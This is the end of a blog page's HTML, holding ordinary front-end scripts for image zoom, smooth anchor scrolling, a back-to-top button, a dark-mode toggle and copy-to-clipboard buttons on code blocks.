<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj+Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    background: '#000000',
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>



<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
